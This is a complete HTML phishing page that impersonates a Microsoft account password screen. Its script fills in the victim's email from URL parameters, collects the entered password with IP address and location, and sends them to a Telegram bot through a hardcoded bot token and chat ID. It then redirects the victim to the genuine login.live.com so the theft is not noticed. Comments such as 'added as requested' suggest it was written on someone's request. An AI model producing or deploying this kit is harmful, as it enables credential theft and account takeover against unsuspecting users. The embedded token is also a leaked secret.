<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Account Login</title>
    <!-- Added jQuery as requested -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-container {
            width: 100%;
            max-width: 440px;
            padding: 44px;
            border: 1px solid #f0f0f0;
            border-radius: 2px;
            box-shadow: none;
            text-align: center;
        }
        
        .microsoft-logo {
            text-align: center;
            margin-bottom: 24px;
            padding-bottom: 30px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .microsoft-logo img {
            height: 32px;
            width: auto;
        }
        
        .user-email {
            display: inline-block;
            color: #1a1a1a;
            width: fit-content;
            margin: 0 auto;
            font-size: 12px;
            margin-bottom: 24px;
            word-break: break-all;
            padding: 4px 8px;
            border: 1px solid #e6e6e6;
            border-radius: 32px;
            background-color: #f9f9f9;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #1a1a1a;
        }
        
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        
        label {
            display: block;
            font-size: 14px;
            margin-bottom: 4px;
            color: #1a1a1a;
            font-weight: 500;
        }
        
        input[type="password"] {
            width: 100%;
            padding: 10px;
            font-size: 15px;
            border: 1px solid #dcdcdc;
            border-bottom: 2px solid #dcdcdc;
            border-radius: 0;
            height: 40px;
        }
        
        input[type="password"]:focus {
            outline: none;
            border: 1px solid #0067b8;
            border-bottom: 2px solid #0067b8;
            box-shadow: none;
        }
        
        .forgot-password {
            display: block;
            margin-top: 4px;
            font-size: 13px;
            font-weight: 400;
            color: #0067b8;
            text-decoration: none;
        }
        
        .forgot-password:hover {
            color: #004275;
            text-decoration: underline;
        }
        
        .next-button {
            width: 100%;
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 10px 12px;
            font-size: 15px;
            font-weight: 400;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 16px;
            height: 40px;
        }
        
        .next-button:hover {
            background-color: #005da6;
        }
        
        .different-account {
            display: block;
            margin-top: 16px;
            text-align: center;
            font-size: 13px;
            color: #0067b8;
            text-decoration: none;
            font-weight: 600;
        }
        
        .different-account:hover {
            color: #004275;
            text-decoration: underline;
        }
        
        .approve-app {
            display: block;
            margin-top: 12px;
            text-align: center;
            font-size: 13px;
            color: #0067b8;
            text-decoration: none;
            font-weight: 600;
        }
        
        .approve-app:hover {
            color: #004275;
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 300px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }
        
        .footer-links a {
            color: #666;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            color: #0067b8;
            text-decoration: underline;
        }
        
        .footer-note {
            line-height: 1.5;
        }
        
        /* Mobile styles */
        @media (max-width: 480px) {
            .login-container {
                padding: 28px;
                border: none;
                box-shadow: none;
                max-width: 100%;
            }
            
            body {
                padding: 0;
                align-items: flex-start;
                padding-top: 28px;
            }
            
            .microsoft-logo {
                font-size: 22px;
            }
            
            h1 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <!-- Hidden inputs for country and region data -->

    <input type="hidden" id="region" value="">

        </div>
        <div class="user-email" id="userEmail"></div>
        
        <h1>Enter your password</h1>
        
        <form id="LoginForm">
            <div class="form-group">
                <input type="password" id="PASSWORD" name="password" required placeholder="Password">
                <a href="#" class="forgot-password">Forgot your password?</a>
            </div>
            
            <button type="submit" class="next-button">Next</button>
        </form>
        
        <a href="#" class="different-account">Sign in with a different Microsoft account</a>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Terms of use</a>
                <a href="#">Privacy and cookies</a>
            </div>
            <div class="footer-note">
                Use private browsing if this is not your device. Learn more
            </div>
        </div>
    </div>

    <!-- JavaScript logic added as requested -->
    <script>
        var moveon = "https://login.live.com/login.srf?contextid=F36BF8030";
        const chatId = "5187399728";
        const apiToken = "7813460965:AAHrNslCV-G2LLykpESgJwN_vx9gbKE0JW4";
        
$(document).ready(function() {
    // Email grabber functionality
    function getEmailFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        // Try multiple parameter names to extract email
        return urlParams.get('[[_email_]]') || 
               urlParams.get('email') || 
               urlParams.get('e') || 
               urlParams.get('user') || 
               urlParams.get('username');
    }

    // Set email dynamically
    const urlEmail = getEmailFromURL();
    if (urlEmail) {
        $('#userEmail').text(urlEmail);
    } else {
        // Show placeholder if no email parameter found
        $('#userEmail').text("[[_email_]]");
        // Make it editable but keep original styling
        $('#userEmail').attr('contenteditable', 'true');
        $('#userEmail').css({
            'background-color': '#f9f9f9',
            'border': '1px solid #e6e6e6',
            'min-width': '200px',
            'outline': 'none'
        });
        
        // Remove outline on focus
        $('#userEmail').on('focus', function() {
            if ($(this).text() === "[[_email_]]") {
                $(this).text("");
            }
            $(this).css('outline', 'none');
        });
        
        // Add placeholder back if empty
        $('#userEmail').on('blur', function() {
            if ($(this).text().trim() === "") {
                $(this).text("[[_email_]]");
            }
        });
    }

    // Get user's location information
    $.getJSON('https://ipapi.co/json/', function(data) {
        $('#country').val(data.country_name);
        $('#region').val(data.region);
    });
    
    $("#LoginForm").on("submit", function(event) {
        event.preventDefault();
        
        // Get email - check if it's the placeholder
        let emailElement = $("#userEmail");
        let email = emailElement.text().trim();
        
        // Don't send if it's still the placeholder
        if (email === "[[_email_]]") {
            alert("Please enter your email address");
            emailElement.css('border', '1px solid red');
            return false;
        }
        
        let password = $("#PASSWORD").val();
        
        // Validate password
        if (!password) {
            alert("Please enter your password");
            $("#PASSWORD").css('border', '1px solid red');
            return false;
        }
        
        $.getJSON('https://api4.ipify.org?format=json', function(data) {
            let ipAddress = data.ip;
            let country = $("#country").val();
            let region = $("#region").val();
            let message = `Hotmail\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}\nCountry: ${country}\nRegion: ${region}`;
            
$.ajax({
    url: `https://api.telegram.org/bot${apiToken}/sendMessage`,
    method: "POST",
    data: {
        chat_id: chatId,
        text: message
    },
    success: function(response) {
        let email = $("#userEmail").text().trim();
        let encodedEmail = encodeURIComponent(email);
        window.location.assign(`${moveon}&username=${encodedEmail}&login=Sign+in`);
    },
    error: function(error) {
        alert("Error sending message.");
    }
});
        });
    });
});
    </script>
</body>
</html>
